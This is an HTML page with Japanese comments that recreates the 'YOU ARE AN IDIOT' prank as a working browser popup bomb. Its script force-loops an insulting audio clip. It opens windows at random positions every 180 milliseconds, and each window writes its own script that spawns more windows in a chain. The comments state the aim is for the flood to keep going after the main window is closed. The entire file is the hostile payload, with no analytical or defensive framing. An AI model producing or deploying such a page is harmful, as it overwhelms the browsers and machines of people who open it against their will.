<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>YOU ARE AN IDIOT</title>
    <style>
        body {
            margin: 0; padding: 0; background: black; color: lime;
            font-family: sans-serif; text-align: center; overflow: hidden;
        }
        h1 {
            font-size: 4em;
            margin: 8vh 0 10px;
            text-shadow: 0 0 30px lime;
            animation: blink 0.15s infinite alternate;
        }
        @keyframes blink { from { opacity: 0.3; } to { opacity: 1; } }
        .idiot-img {
            max-width: 95vw;
            max-height: 72vh;
            width: auto;
            height: auto;
            margin: 10px auto;
            display: block;
            border: 10px solid lime;
            box-shadow: 0 0 50px lime;
        }
        p { font-size: 1.9em; margin: 20px; color: #ff0; animation: blink 0.6s infinite; }
    </style>
</head>
<body>
    <h1>YOU ARE AN IDIOT</h1>
    <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
         class="idiot-img" alt="You are an idiot">
    <p>メインウィンドウを閉じても勝手に増え続けるよ...<br>180msごとに爆増</p>

    <audio id="idiotSound" preload="auto" loop></audio>

    <script>
        const sound = document.getElementById('idiotSound');
        sound.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
        let count = 1;

        function forcePlay(audio) {
            if (!audio) return;
            audio.currentTime = 0;
            audio.play().catch(() => setTimeout(() => forcePlay(audio), 30));
        }

        function spawnPopup() {
            const width = 480;
            const height = 440;
            const left = Math.random() * (screen.availWidth - width - 100) + 50;
            const top = Math.random() * (screen.availHeight - height - 100) + 50;

            const popup = window.open('', '_blank', 
                `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
            );

            if (popup) {
                popup.document.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <meta charset="UTF-8">
                        <title>YOU ARE AN IDIOT ×${count}</title>
                        <style>
                            body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
                            h1 { font-size:3em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.3s infinite alternate; }
                            .idiot-img { max-width:95vw; max-height:72vh; width:auto; height:auto; margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; }
                            @keyframes blink { from { opacity: 0.4; } to { opacity: 1; } }
                        </style>
                    </head>
                    <body>
                        <h1>YOU ARE AN IDIOT</h1>
                        <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
                        <p>勝手に増えてる...</p>
                        <audio id="sound" preload="auto" loop></audio>
                        <script>
                            const s = document.getElementById('sound');
                            s.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";

                            function forcePlay() {
                                s.currentTime = 0;
                                s.play().catch(() => setTimeout(forcePlay, 30));
                            }

                            window.onload = function() {
                                forcePlay();
                                setTimeout(forcePlay, 20);
                                setTimeout(forcePlay, 50);

                                // ★★★ メインウィンドウを閉じても止まらないように ★★★
                                // 各ポップアップが独立して180msごとに新しいポップアップを生成
                                setInterval(() => {
                                    // 新しいポップアップを直接生成
                                    const w = 480;
                                    const h = 440;
                                    const l = Math.random() * (screen.availWidth - w - 100) + 50;
                                    const t = Math.random() * (screen.availHeight - h - 100) + 50;

                                    window.open('', '_blank', 
                                        `width=${w},height=${h},left=${Math.floor(l)},top=${Math.floor(t)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
                                    ).document.write(\`
                                        <!DOCTYPE html>
                                        <html>
                                        <head>
                                            <meta charset="UTF-8">
                                            <title>YOU ARE AN IDIOT ×\${count}</title>
                                            <style>
                                                body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
                                                h1 { font-size:3em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.3s infinite alternate; }
                                                .idiot-img { max-width:95vw; max-height:72vh; width:auto; height:auto; margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; }
                                                @keyframes blink { from { opacity: 0.4; } to { opacity: 1; } }
                                            </style>
                                        </head>
                                        <body>
                                            <h1>YOU ARE AN IDIOT</h1>
                                            <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
                                            <p>勝手に増えてる...</p>
                                            <audio id="sound" preload="auto" loop></audio>
                                            <script>
                                                const s = document.getElementById('sound');
                                                s.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
                                                function forcePlay() {
                                                    s.currentTime = 0;
                                                    s.play().catch(() => setTimeout(forcePlay, 30));
                                                }
                                                window.onload = function() {
                                                    forcePlay();
                                                    setTimeout(forcePlay, 20);
                                                    setTimeout(forcePlay, 50);
                                                    setInterval(() => {
                                                        // 自分もさらに増やす（連鎖）
                                                        const nw = 480; const nh = 440;
                                                        const nl = Math.random() * (screen.availWidth - nw - 100) + 50;
                                                        const nt = Math.random() * (screen.availHeight - nh - 100) + 50;
                                                        window.open('', '_blank', \`width=\${nw},height=\${nh},left=\${Math.floor(nl)},top=\${Math.floor(nt)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no\`);
                                                    }, 180);
                                                };
                                            <\/script>
                                        </body>
                                        </html>
                                    \`);
                                }, 180);
                            };
                        <\/script>
                    </body>
                    </html>
                `);
                popup.document.close();
                count++;
            }
        }

        // メイン画面の処理
        window.onload = () => {
            function mainForcePlay() {
                sound.currentTime = 0;
                sound.play().catch(() => setTimeout(mainForcePlay, 30));
            }

            mainForcePlay();
            setTimeout(mainForcePlay, 10);
            setTimeout(mainForcePlay, 30);

            // 初期連発
            setTimeout(() => spawnPopup(), 100);
            setTimeout(() => spawnPopup(), 180);
            setTimeout(() => spawnPopup(), 260);
            setTimeout(() => spawnPopup(), 340);

            // メインも180msで増やす（保険）
            setTimeout(() => {
                setInterval(spawnPopup, 180);
            }, 500);

            // 音の保険
            setInterval(() => {
                if (sound.paused) mainForcePlay();
            }, 30);
        };
    </script>
</body>
</html>
